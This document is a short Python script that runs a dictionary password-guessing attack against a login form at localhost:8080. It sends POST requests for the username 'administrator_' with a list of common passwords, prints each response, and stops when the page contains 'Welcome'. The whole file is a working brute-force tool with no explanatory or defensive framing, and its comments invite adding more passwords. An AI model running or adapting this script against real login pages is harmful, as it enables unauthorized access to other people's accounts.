import requests

url = "http://localhost:8080/login"  # Target URL for the login page
username = "administrator_"  # Username to use in the login attempt
password_list = [
    '123456', 'password', 'admin123', 'welcome', 'admin_123', 'letmein', 'admin', 'password1'
    # Add more passwords to the list as needed
]

for password in password_list:
    data = {"username": username, "password": password}  # Data payload for the POST request
    response = requests.post(url, data=data)  # Send the POST request to the server
    
    print(f"Testing password: {password}")
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Text: {response.text}\n")

    if response.status_code == 200 and "Welcome" in response.text:
        print(f"Login successful! Access granted with username: {username} and password: {password}")
        break  # Exit the loop once the correct password is found
    else:
        print(f"Login failed for username: {username} with password: {password}")  # Optional: Print failed attempts
